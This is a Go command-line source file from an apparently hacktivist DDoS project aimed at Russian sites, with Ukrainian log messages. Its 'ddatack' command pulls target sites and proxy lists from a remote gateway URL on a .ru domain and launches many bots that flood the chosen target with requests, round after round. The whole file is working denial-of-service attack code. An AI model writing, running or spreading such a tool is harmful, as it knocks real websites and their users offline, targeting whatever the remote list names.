package cmd

import (
	"context"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"

	log "github.com/sirupsen/logrus"
	"github.com/spf13/cobra"

	"github.com/meddion/anti-rusnya-ddos/pkg"
)

var (
	ddatackCmd = &cobra.Command{
		Use:   "ddatack",
		Short: "надсилає багато запитів на обрані цілі, цілі оновлюються через API",
		Args:  cobra.MinimumNArgs(0),
		Run:   ddatackRun,
	}
	gateway string
)

func init() {
	ddatackCmd.PersistentFlags().StringVar(
		&gateway,
		"gateway",
		"http://rockstarbloggers.ru/hosts.json",
		"кількість ботів (активних з'єднань)",
	)
}

func ddatackRun(cmd *cobra.Command, args []string) {
	// Shutdown signal
	done := make(chan struct{}, 1)
	var once sync.Once
	terminate := func() {
		once.Do(func() {
			close(done)
		})
	}
	// Os signal handler
	sigs := make(chan os.Signal, 1)
	signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigs
		terminate()
		log.Infoln("Готуюся до закриття.")
	}()

	for epoch := 0; true; epoch++ {
		select {
		case <-done:
			return
		default:
		}

		ctx, termBots := context.WithCancel(context.Background())
		epochDone := make(chan struct{}, 1)
		go func() {
			select {
			case <-epochDone:
			case <-done:
				termBots()
			}
		}()

		log.Infof("Готуюся до атаки русні :) Сесія: %d \n", epoch)
		log.Infof("Кожні %d запитів ціль і проксі можуть змінюватися.\n", reqPerEpoch)

		srcCtx, cancel := context.WithTimeout(ctx, time.Second)
		src, err := pkg.GetSrcURL(srcCtx, gateway)
		cancel()
		if err != nil {
			select {
			case <-ctx.Done():
				if _, ok := ctx.Deadline(); ok {
					log.Infof("Час очікування на джерела закінчився")
					close(epochDone)
					continue
				}
				return
			default:
			}

			log.Infof("Отримуємо списки джерел: %v\n", err)
			continue
		}
		log.Infof("Обране джерело: %s\n (ПЕРЕВІРТЕ ЙОГО ДОСТОВІРНІСТЬ)", src)

		srcCtx, cancel = context.WithTimeout(ctx, time.Second)
		srcRsp, err := pkg.GetDataFromSrc(ctx, src)
		cancel()
		if err != nil {
			select {
			case <-ctx.Done():
				if _, ok := ctx.Deadline(); ok {
					log.Infof("Час очікування від джерела закінчився")
					close(epochDone)
					continue
				}
				return
			default:
			}

			log.Errorf("Не вдалося отримати дані від джерела: %v\n", err)
			continue
		}

		log.Infof("Дані із джерела підвантажено. Ціль: %s, К-ість проксі: %d\n", srcRsp.Site.URL, len(srcRsp.Proxies))

		var wg sync.WaitGroup
		counter := make(chan bool, botsNum)

		if err := pkg.StartBots(ctx, &wg, srcRsp, maxErrCount, botsNum, counter); err != nil {
			log.Errorf("Не вдалося запустити ботів: %v\n", err)
			continue
		}

		go pkg.RequestLimiter(ctx, termBots, &wg, reqPerEpoch, counter)

		wg.Wait()
		close(epochDone)
	}
}
